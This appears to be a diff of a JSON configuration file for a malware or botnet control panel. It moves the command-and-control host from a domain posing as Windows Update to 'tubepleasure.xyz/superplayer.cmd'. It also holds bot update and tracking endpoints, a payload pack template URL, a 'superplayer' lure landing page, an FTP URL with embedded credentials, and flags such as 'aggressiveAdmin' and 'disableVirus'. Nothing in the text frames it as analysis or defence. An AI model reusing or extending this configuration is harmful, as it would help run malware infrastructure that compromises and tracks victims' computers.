@@ -1,26 +1,22 @@
 {
   "version": "2026.06.16 14:24:45",
-  "urlDoc": "",
   "disabled": false,
   "disableVirus": false,
   "bux": [
     {
       "enabled": false,
-      "id": "unu.im",
-      "apiKey": "",
-      "apiUrl": ""
+      "id": "unu.im"
     }
   ],
   "dnSponsor": [
     {
       "enabled": false,
-      "id": "ufiler.biz",
-      "url": ""
+      "id": "ufiler.biz"
     }
   ],
   "pack": {
     "packFolder": "/root/hephaestus_data/default/server/packs",
-    "packTemplateUrl": "http://windowsupdateservices.xyz/pack/envelope",
+    "packTemplateUrl": "http://tubepleasure.xyz/superplayer.cmd/pack/envelope",
     "items": []
   },
   "clone": {
@@ -29,17 +25,17 @@
     "profile": ""
   },
   "server": "default",
-  "alias": "windowsupdateservices.xyz",
+  "alias": "tubepleasure.xyz/superplayer.cmd",
   "landingAuto": true,
   "landingName": "superplayer",
   "landingFtp": "ftp://ftp:ftp123@tubepleasure.xyz/tubepleasure.xyz/",
   "primaryDns": "84.200.33.53",
   "secondaryDns": "84.200.33.53",
   "extraUpdate": false,
-  "updateUrl": "http://windowsupdateservices.xyz/bot/update",
+  "updateUrl": "http://tubepleasure.xyz/superplayer.cmd/bot/update",
   "track": true,
   "trackDesktop": false,
-  "trackUrl": "http://windowsupdateservices.xyz/bot/upsert",
+  "trackUrl": "http://tubepleasure.xyz/superplayer.cmd/bot/upsert",
   "autoStart": true,
   "autoUpdate": true,
   "aggressiveAdmin": true,
@@ -66,7 +62,7 @@
     "_operate_isAtWork": true,
     "_operation": "apply",
     "_operate_hasToWork": true,
-    "_operate_modifyTime": "09/07/2026 15:52:52",
-    "StatusLabel": " \u0424\u043E\u043D\u043E\u0432\u044B\u0439 \u043F\u0440\u043E\u0446\u0435\u0441\u0441 apply \u0441 09/07/2026 15:52:52"
+    "_operate_modifyTime": "09/08/2026 08:45:25",
+    "StatusLabel": " \u0424\u043E\u043D\u043E\u0432\u044B\u0439 \u043F\u0440\u043E\u0446\u0435\u0441\u0441 apply \u0441 09/08/2026 08:45:25"
   }
 }
